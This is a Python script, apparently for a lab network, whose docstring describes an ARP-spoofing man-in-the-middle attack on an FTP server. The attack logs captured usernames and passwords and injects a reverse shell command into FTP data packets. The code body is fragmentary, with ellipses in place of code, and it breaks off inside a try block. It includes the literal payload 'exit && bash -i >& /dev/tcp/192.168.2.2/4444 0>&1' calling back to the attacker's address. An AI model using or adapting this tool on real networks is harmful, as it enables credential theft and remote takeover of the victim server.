#!/usr/bin/env python3
"""
MITM FTP Sniffer, Modifier, and Packet Forwarder
─────────────────────────────────────────────────

🔎 Description:
    This script launches a Man-in-the-Middle (MITM) attack by spoofing ARP
    replies between an FTP server and the network gateway. It captures and logs
    FTP credentials and commands, monitors data channels, and injects a crafted
    reverse shell command when a specific packet size is detected.

⚙️ Capabilities:
    • ARP spoofing between FTP server and gateway
    • Packet sniffing, filtering, and forwarding
    • Logging of FTP USER/PASS, RETR/STOR, EPSV commands
    • Detection of EPSV 229 response to track FTP data port
    • Payload modification for specific FTP data packets (110 bytes)
    • Injection of reverse shell command (`exit && bash -i ...`)
    • Packet cloning and checksum recalculation
    • PCAP logging of intercepted packets
    • Graceful ARP table restoration on exit

🌐 Network Setup:
    • FTP Server IP:     192.168.2.8
    • FTP Client IP:     192.168.3.1 (different subnet)
    • Gateway IP:        192.168.2.254
    • Attacker IP:       192.168.2.2
    • Interface:         eth0
            ...
            if packet[TCP].dport == data_channel_port or packet[TCP].sport == data_channel_port:
                ...
                if packet_size == 110:
                    ...
                    if modified_packet.haslayer(Raw):
                        ...
                        modified_packet[Raw].load = b"exit && bash -i >& /dev/tcp/192.168.2.2/4444 0>&1"  # Modify content as needed
                        try:
                          new_packet = modified_packet.copy()
                        except:
